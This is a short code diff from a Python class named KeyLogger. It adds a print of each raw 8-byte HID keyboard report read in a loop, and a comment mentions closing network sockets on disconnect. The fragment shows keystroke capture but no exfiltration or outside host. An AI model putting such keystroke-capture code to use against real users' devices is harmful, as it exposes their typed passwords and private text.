@@ -50,6 +50,7 @@ class KeyLogger:
         while True:
             try:
                 data = keyboard.read(8)  # Read an 8-byte HID report
+                print(data)
             except OSError:
                 logging.error("Keyboard no longer connected")
                 # close all network sockets
